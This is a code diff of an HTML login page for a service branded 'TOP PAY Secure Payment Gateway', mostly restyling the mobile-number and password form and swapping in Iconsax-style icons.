@@ -9,7 +9,11 @@
 <link rel="icon" type="image/webp" href="https://i.ibb.co/fVqwvyvF/aa.webp">
 <link rel="apple-touch-icon" href="https://i.ibb.co/fVqwvyvF/aa.webp">
 
+<!-- Iconsax -->
+<script src="https://cdn.jsdelivr.net/npm/iconsax@1.0.0/dist/iconsax.js"></script>
+
 <style>
+
 *{
     box-sizing:border-box;
     -webkit-tap-highlight-color:transparent;
@@ -41,6 +45,7 @@ body{
     margin:0 auto;
     padding:8px 16px 15px;
 }
+
 
 /* ================= HEADER ================= */
 
@@ -74,15 +79,12 @@ body{
     font-weight:400;
 }
 
+
 /* ================= STEPS ================= */
 
 .steps{
     width:48%;
-
-    /*
-     * No gap before poster
-     */
-    margin:13px auto 0;
+    margin:13px auto 2px;
 
     display:flex;
     align-items:flex-start;
@@ -106,7 +108,6 @@ body{
 .circle{
     width:30px;
     height:30px;
-
     border-radius:50%;
 
     display:flex;
@@ -149,15 +150,14 @@ body{
 
 .step-line{
     flex:1;
-
     height:2.5px;
 
     border-radius:5px;
-
     background:#2c68d0;
 
     margin:12px 3px 0;
 }
+
 
 /* ================= POSTER ================= */
 
@@ -167,10 +167,7 @@ body{
 
     position:relative;
 
-    /*
-     * Absolutely zero external gap
-     */
-    margin:0;
+    margin:0 0 2px;
 
     overflow:hidden;
 
@@ -180,7 +177,6 @@ body{
 
 .slides-track{
     position:absolute;
-
     top:0;
     left:0;
 
@@ -210,12 +206,12 @@ body{
     height:100%;
 
     object-fit:cover;
-
     display:block;
 
     user-select:none;
     -webkit-user-drag:none;
 }
+
 
 /* ================= DOTS ================= */
 
@@ -253,6 +249,7 @@ body{
     background:#fff;
 }
 
+
 /* ================= CARD ================= */
 
 .card{
@@ -260,10 +257,7 @@ body{
 
     border-radius:0 0 17px 17px;
 
-    /*
-     * Zero gap between poster and title
-     */
-    padding:0 21px 22px;
+    padding:2px 21px 22px;
 }
 
 .card-title{
@@ -271,21 +265,18 @@ body{
 
     text-align:center;
 
-    /*
-     * Reduced from 30px
-     */
-    font-size:25px;
-    line-height:31px;
+    font-size:22px;
+    line-height:28px;
 
     font-weight:700;
 
-    letter-spacing:-.3px;
+    letter-spacing:-.25px;
 
     white-space:nowrap;
 }
 
 .description{
-    margin:13px 0 27px;
+    margin:11px 0 24px;
 
     text-align:center;
 
@@ -297,40 +288,62 @@ body{
     font-weight:400;
 }
 
+
 /* ================= INPUTS ================= */
 
 .input-box{
     width:100%;
-    height:49px;
+    height:44px;
 
-    border:1.2px solid #e4e4e4;
-    border-radius:15px;
+    border:1.2px solid #e2e2e2;
+    border-radius:13px;
 
     display:flex;
     align-items:center;
 
     background:#fff;
+
+    transition:
+        border-color .18s ease,
+        box-shadow .18s ease;
 }
 
 .input-box:focus-within{
-    border-color:#c7d4ea;
+    border-color:#b9cbe8;
+
+    box-shadow:
+        0 0 0 3px rgba(46,103,201,.06);
 }
 
+
+/*
+ * Iconsax Filled style
+ */
+
 .input-icon{
-    width:36px;
-    min-width:36px;
+    width:37px;
+    min-width:37px;
 
     display:flex;
-    justify-content:center;
     align-items:center;
+    justify-content:center;
 }
 
 .input-icon svg{
-    width:18px;
-    height:18px;
+    width:19px;
+    height:19px;
 
-    fill:#080808;
+    fill:#161616;
+    stroke:#161616;
+
+    stroke-width:1.5;
+
+    stroke-linecap:round;
+    stroke-linejoin:round;
 }
+
+
+/* ================= INPUT TEXT ================= */
 
 .input-box input{
     width:100%;
@@ -354,13 +367,14 @@ body{
 
     opacity:1;
 
-    font-size:15px;
+    font-size:14px;
 }
+
 
 /* ================= FORGOT ================= */
 
 .forgot{
-    margin-top:10px;
+    margin-top:9px;
     text-align:right;
 }
 
@@ -378,13 +392,14 @@ body{
     font-weight:400;
 }
 
+
 /* ================= CONTINUE ================= */
 
 .continue{
     width:100%;
     height:54px;
 
-    margin-top:19px;
+    margin-top:17px;
 
     border:0;
     border-radius:14px;
@@ -418,6 +433,7 @@ body{
     font-weight:300;
 }
 
+
 /* ================= REGISTER ================= */
 
 .register{
@@ -439,6 +455,7 @@ body{
     cursor:pointer;
 }
 
+
 /* ================= SECURITY ================= */
 
 .security{
@@ -456,6 +473,7 @@ body{
     color:#555;
     font-weight:500;
 }
+
 
 /* ================= TELEGRAM ================= */
 
@@ -485,9 +503,9 @@ body{
 .telegram svg{
     width:23px;
     height:23px;
-
     fill:#fff;
 }
+
 
 /* ================= TOAST ================= */
 
@@ -531,13 +549,14 @@ body{
         translateY(0);
 }
 
+
 /* ================= MOBILE ================= */
 
 @media (max-width:380px){
 
     .steps{
         width:52%;
-        margin-bottom:0;
+        margin-bottom:2px;
     }
 
     .poster{
@@ -545,11 +564,11 @@ body{
         aspect-ratio:655 / 261;
 
         margin-top:0;
-        margin-bottom:0;
+        margin-bottom:2px;
     }
 
     .card{
-        padding-top:0;
+        padding-top:2px;
     }
 }
 
@@ -560,214 +579,69 @@ body{
     }
 
     .card-title{
-        font-size:23px;
-        line-height:29px;
+        font-size:21px;
+        line-height:27px;
     }
 }
+
 </style>
 </head>
+
 
 <body>
 
 <div class="page">
 
-    <!-- HEADER -->
 
-    <div class="header">
+<!-- ================= HEADER ================= -->
 
-        <img
-            class="logo"
-            src="https://i.ibb.co/fVqwvyvF/aa.webp"
-            alt="TOP PAY"
-        >
+<div class="header">
 
-        <div class="logo-name">
-            TOP PAY
+    <img
+        class="logo"
+        src="https://i.ibb.co/fVqwvyvF/aa.webp"
+        alt="TOP PAY"
+    >
+
+    <div class="logo-name">
+        TOP PAY
+    </div>
+
+    <div class="subtitle">
+        Secure Payment Gateway
+    </div>
+
+</div>
+
+
+<!-- ================= STEPS ================= -->
+
+<div class="steps">
+
+    <div class="step active">
+
+        <div class="circle">
+            1
         </div>
 
-        <div class="subtitle">
-            Secure Payment Gateway
+        <div class="step-name">
+            Account
         </div>
 
     </div>
 
 
-    <!-- STEPS -->
+    <div class="step-line"></div>
 
-    <div class="steps">
 
-        <div class="step active">
+    <div class="step inactive">
 
-            <div class="circle">
-                1
-            </div>
-
-            <div class="step-name">
-                Account
-            </div>
-
+        <div class="circle">
+            2
         </div>
 
-
-        <div class="step-line"></div>
-
-
-        <div class="step inactive">
-
-            <div class="circle">
-                2
-            </div>
-
-            <div class="step-name">
-                MPIN
-            </div>
-
-        </div>
-
-    </div>
-
-
-    <!-- POSTER -->
-
-    <div class="poster">
-
-        <div
-            class="slides-track"
-            id="slidesTrack">
-        </div>
-
-        <div
-            class="dots"
-            id="dots">
-        </div>
-
-    </div>
-
-
-    <!-- CARD -->
-
-    <div class="card">
-
-        <h1 class="card-title">
-            Enter Your Credentials
-        </h1>
-
-        <p class="description">
-            Enter your registered mobile number and password
-            to continue securely.
-        </p>
-
-
-        <!-- MOBILE NUMBER -->
-
-        <div class="input-box">
-
-            <div class="input-icon">
-
-                <svg viewBox="0 0 24 24">
-
-                    <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.02-.24c1.12.37 2.33.57 3.57.57a1 1 0 011 1V20a1 1 0 01-1 1C10.61 21 3 13.39 3 4a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.2 2.45.57 3.57a1 1 0 01-.25 1.02l-2.2 2.2z"/>
-
-                </svg>
-
-            </div>
-
-            <input
-                id="mobile"
-                type="tel"
-                inputmode="numeric"
-                maxlength="10"
-                placeholder="Mobile Number"
-                autocomplete="tel"
-            >
-
-        </div>
-
-
-        <!-- PASSWORD -->
-
-        <div
-            class="input-box"
-            style="margin-top:12px;">
-
-            <div class="input-icon">
-
-                <svg viewBox="0 0 24 24">
-
-                    <path d="M17 8h-1V6a4 4 0 00-8 0v2H7a2 2 0 00-2 2v8a2 2 0 002 2h10a2 2 0 002-2v-8a2 2 0 00-2-2zm-7-2a2 2 0 014 0v2h-4V6zm5 9h-2v2h-2v-2H9v-2h2v-2h2v2h2v2z"/>
-
-                </svg>
-
-            </div>
-
-            <input
-                id="password"
-                type="password"
-                placeholder="Password"
-                autocomplete="current-password"
-            >
-
-        </div>
-
-
-        <!-- FORGOT -->
-
-        <div class="forgot">
-
-            <button
-                type="button"
-                id="forgotBtn">
-
-                Forgot Password?
-
-            </button>
-
-        </div>
-
-
-        <!-- CONTINUE -->
-
-        <button
-            class="continue"
-            id="continueBtn"
-            type="button"
-            disabled>
-
-            <span>
-                Continue to MPIN
-            </span>
-
-            <span class="arrow">
-                →
-            </span>
-
-        </button>
-
-
-        <!-- REGISTER -->
-
-        <button
-            class="register"
-            id="registerBtn"
-            type="button">
-
-            Register New Account
-
-        </button>
-
-
-        <!-- SECURITY -->
-
-        <div class="security">
-
-            🔒 Your information is securely encrypted.
-
-            <br>
-
-            <strong>
-                Never share your password or MPIN with anyone.
-            </strong>
-
+        <div class="step-name">
+            MPIN
         </div>
 
     </div>
@@ -775,7 +649,167 @@ body{
 </div>
 
 
-<!-- TELEGRAM -->
+<!-- ================= POSTER ================= -->
+
+<div class="poster">
+
+    <div
+        class="slides-track"
+        id="slidesTrack">
+    </div>
+
+    <div
+        class="dots"
+        id="dots">
+    </div>
+
+</div>
+
+
+<!-- ================= CARD ================= -->
+
+<div class="card">
+
+    <h1 class="card-title">
+        Enter Your Credentials
+    </h1>
+
+    <p class="description">
+        Enter your registered mobile number and password
+        to continue securely.
+    </p>
+
+
+    <!-- MOBILE NUMBER -->
+
+    <div class="input-box">
+
+        <div class="input-icon">
+
+            <!-- Iconsax Bold / Filled Phone -->
+
+            <svg
+                viewBox="0 0 24 24"
+                aria-hidden="true">
+
+                <path
+                    d="M21.02 16.83c0-.66-.53-1.2-1.19-1.2-.73 0-1.45-.11-2.14-.33a1.9 1.9 0 0 0-1.95.46l-.9.9a14.6 14.6 0 0 1-5.48-5.48l.9-.9a1.9 1.9 0 0 0 .46-1.95c-.22-.69-.33-1.41-.33-2.14 0-.66-.54-1.19-1.2-1.19H6.12c-.66 0-1.2.54-1.2 1.2 0 8.15 6.61 14.76 14.76 14.76.66 0 1.2-.54 1.2-1.2v-2.93z">
+                </path>
+
+            </svg>
+
+        </div>
+
+        <input
+            id="mobile"
+            type="tel"
+            inputmode="numeric"
+            maxlength="10"
+            placeholder="Mobile Number"
+            autocomplete="tel"
+        >
+
+    </div>
+
+
+    <!-- PASSWORD -->
+
+    <div
+        class="input-box"
+        style="margin-top:10px;">
+
+        <div class="input-icon">
+
+            <!-- Iconsax Bold / Filled Lock -->
+
+            <svg
+                viewBox="0 0 24 24"
+                aria-hidden="true">
+
+                <path
+                    d="M18 8.5h-.75V6.75C17.25 3.85 14.9 1.5 12 1.5S6.75 3.85 6.75 6.75V8.5H6c-1.66 0-3 1.34-3 3v8c0 1.66 1.34 3 3 3h12c1.66 0 3-1.34 3-3v-8c0-1.66-1.34-3-3-3ZM9 6.75C9 5.09 10.35 3.75 12 3.75s3 1.34 3 3V8.5H9v-1.75Zm4.25 9.5v1.5h-2.5v-1.5a2.25 2.25 0 1 1 2.5 0Z">
+                </path>
+
+            </svg>
+
+        </div>
+
+        <input
+            id="password"
+            type="password"
+            placeholder="Password"
+            autocomplete="current-password"
+        >
+
+    </div>
+
+
+    <!-- FORGOT -->
+
+    <div class="forgot">
+
+        <button
+            type="button"
+            id="forgotBtn">
+
+            Forgot Password?
+
+        </button>
+
+    </div>
+
+
+    <!-- CONTINUE -->
+
+    <button
+        class="continue"
+        id="continueBtn"
+        type="button"
+        disabled>
+
+        <span>
+            Continue to MPIN
+        </span>
+
+        <span class="arrow">
+            →
+        </span>
+
+    </button>
+
+
+    <!-- REGISTER -->
+
+    <button
+        class="register"
+        id="registerBtn"
+        type="button">
+
+        Register New Account
+
+    </button>
+
+
+    <!-- SECURITY -->
+
+    <div class="security">
+
+        🔒 Your information is securely encrypted.
+
+        <br>
+
+        <strong>
+            Never share your password or MPIN with anyone.
+        </strong>
+
+    </div>
+
+</div>
+
+</div>
+
+
+<!-- ================= TELEGRAM ================= -->
 
 <div
     class="telegram"
@@ -783,14 +817,25 @@ body{
 
     <svg viewBox="0 0 24 24">
 
-        <path d="M21.4 3.6L18.2 20c-.24 1.16-.87 1.45-1.76.9l-4.85-3.58-2.34 2.25c-.26.26-.48.48-.98.48l.35-4.94 8.99-8.12c.39-.35-.08-.55-.6-.2L6.9 13.95 2.15 12.47c-1.03-.32-1.05-1.03.21-1.52L20.9 3.72c.86-.32 1.61.2 1.5-.12z"/>
+        <path
+            d="M21.4 3.6L18.2 20
+            c-.24 1.16-.87 1.45-1.76.9
+            l-4.85-3.58-2.34 2.25
+            c-.26.26-.48.48-.98.48
+            l.35-4.94 8.99-8.12
+            c.39-.35-.08-.55-.6-.2
+            L6.9 13.95 2.15 12.47
+            c-1.03-.32-1.05-1.03.21-1.52
+            L20.9 3.72
+            c.86-.32 1.61.2 1.5-.12z">
+        </path>
 
     </svg>
 
 </div>
 
 
-<!-- TOAST -->
+<!-- ================= TOAST ================= -->
 
 <div
     class="toast"
@@ -850,7 +895,9 @@ function createSlides(){
             img.src = poster;
             img.alt = "TOP PAY";
 
+
             slide.appendChild(img);
+
             track.appendChild(slide);
 
 
@@ -859,7 +906,9 @@ function createSlides(){
 
             dot.className =
                 "dot" +
-                (index === 0 ? " active" : "");
+                (index === 0
+                    ? " active"
+                    : "");
 
 
             dot.addEventListener(
@@ -869,6 +918,7 @@ function createSlides(){
                     currentSlide = index;
 
                     updateSlider();
+
                     restartSlider();
 
                 }
@@ -958,7 +1008,10 @@ const continueBtn =
 function validateForm(){
 
     const mobileValue =
-        mobile.value.replace(/\D/g,"");
+        mobile.value.replace(
+            /\D/g,
+            ""
+        );
 
     mobile.value =
         mobileValue.slice(0,10);
@@ -1086,7 +1139,9 @@ document
 /* ================= INIT ================= */
 
 createSlides();
+
 updateSlider();
+
 startSlider();
 
 </script>
